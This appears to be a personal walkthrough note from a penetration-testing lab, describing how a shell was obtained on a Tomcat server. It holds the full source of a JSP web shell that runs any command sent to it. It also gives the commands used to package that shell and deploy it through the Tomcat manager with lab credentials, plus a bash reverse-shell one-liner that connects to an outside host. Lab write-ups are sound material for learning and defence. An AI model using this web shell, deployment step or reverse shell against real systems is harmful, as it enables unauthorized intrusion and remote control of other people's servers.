# Getting a Shell

### Put files mannualy with Curl 

content of cmdjsp.jsp
```java
// note that linux = cmd and windows = "cmd.exe /c + cmd" 

<FORM METHOD=POST ACTION='cmdjsp.jsp'>
<INPUT name='eris' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("eris");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>


```

Tranform the .jsp to .war (tomcat only accpted war files)

```bash
$ zip cmdjsp.war cmdjsp.jsp
```

```bash
curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app
```
![[Pasted image 20211213124649.png]]


http://10.10.10.194:8080/app/cmdjsp.jsp
![[Pasted image 20211213124746.png]]

Can't do reverse shell, the cmdjsp.jsp doens't like the characteres of the reverse shell.
 Do a curl to save our shell file on the system and execute
 
 content of shell.sh
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1
 ```
 
 
 ![[Pasted image 20211213130845.png]]
 
 ![[Pasted image 20211213131208.png]]
 
 ![[Pasted image 20211213131230.png]]
 
 ![[Pasted image 20211213131241.png]]